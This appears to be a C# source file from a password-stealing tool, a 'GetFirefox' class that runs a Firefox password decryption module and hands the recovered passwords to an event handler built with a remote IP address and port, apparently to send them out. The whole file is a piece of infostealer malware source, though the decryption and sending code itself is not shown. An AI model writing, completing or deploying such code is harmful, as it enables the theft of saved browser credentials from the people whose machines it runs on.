using PS03.PasswordOps.FirefoxDecrypt;

namespace PS03.PasswordOps
{
    public class GetFirefox
    {
        private int _port;
        private string _ip;

        public GetFirefox(string ip, int port)
        {
            this._ip = ip;
            this._port = port;
        }
        public void Execute()
        {
            var ev = new Eventhandlers(_ip,_port);
            FDC.OnPasswordReady += ev.HandleFirefoxDataReady;
            FDC.Execute();
        }
    }
}
